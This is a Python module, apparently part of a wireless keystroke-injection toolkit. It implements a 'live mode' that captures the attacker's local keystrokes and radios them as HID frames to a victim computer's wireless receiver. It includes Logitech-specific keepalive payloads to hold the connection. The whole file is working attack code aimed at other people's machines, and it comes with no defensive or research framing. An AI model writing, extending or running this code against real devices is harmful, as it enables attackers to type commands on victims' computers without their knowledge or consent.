import time
from pynput import keyboard # library for controlling and monitoring input devices
from .vendors import logitech
from .hid_scan_codes import *
from .general_utils import *
from .injection_utils import *

DELAY_BETWEEN_TRANSMISSIONS = 10 / 1000 # 10ms

kbhit = False # flag indicating whether a key was hit
key_released = False # flag indicating whether a key was released
pressed_key = None # stores the pressed key

# function called when the listener catches a key press
def on_press(key):
    # stating that these variables are the same ones declared in the global scope, not locals
    global kbhit
    global pressed_key

    kbhit = True # updating the flag
    try:
        pressed_key = key.char # trying to store the pressed character
    except AttributeError: # if key doesn't have a "char" attribute, then it's a key that doesn't correspond to a character
        pressed_key = key

# function called when the listener catches a key release
def on_release(key):
    global key_released # stating that this variable is the same one declared in the global scope, not local
    key_released = True # updating the flag

def live_mode(radio, vendor=logitech):
    """
    This function implements live mode, which allows the attacker to use their own keyboard as if it's connected to the victim computer.
    Meaning, it listens for keystrokes on this PC and transmits them to the victim the moment they occur.
    """

    # stating that these variables are the same ones declared in the global scope, not locals
    global kbhit
    global key_released

    # initializing the listener, which is a background thread listening for keystrokes
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

    # for logitech, first transmit the payload that sets the keepalive timeout, just like in a regular attack
    if vendor == logitech:
        try_transmit(radio, logitech.SET_KEEPALIVE_TIMEOUT_PAYLOAD)
        time.sleep(DELAY_BETWEEN_TRANSMISSIONS)

    # the main thread is constantly checking the boolean flags, which are updated inside on_press/on_release when those are called by the listener
    while True:
        if kbhit:
            # if Esc was pressed, stopping the listener thread and exiting live mode
            if pressed_key == keyboard.Key.esc:
                listener.stop()
                break

            if isinstance(pressed_key, str): # if a character was pressed, take its scan code and modifier from the printable_characters dictionary
                scan_code, modifier = printable_characters[pressed_key]
            elif isinstance(pressed_key, keyboard.Key): # if a non-character key was pressed, take its scan code and modifier using the special dictionary
                scan_code, modifier = other_keys[pynput_dict[pressed_key]]

            # transmit the proper frame
            try_transmit(radio, vendor.build_frame(scan_code, modifier))
            time.sleep(DELAY_BETWEEN_TRANSMISSIONS)

            kbhit = False # reset the flag until the next time a key is pressed

        elif key_released:
            try_transmit(radio, vendor.build_frame(KEY_RELEASE)) # transmit a key release frame
            key_released = False # reset the flag until the next time a key is released

        else:
            # transmit keepalives all the time when no key is pressed
            time.sleep(DELAY_BETWEEN_TRANSMISSIONS)
            try_transmit(radio, vendor.KEEPALIVE_PAYLOAD)
            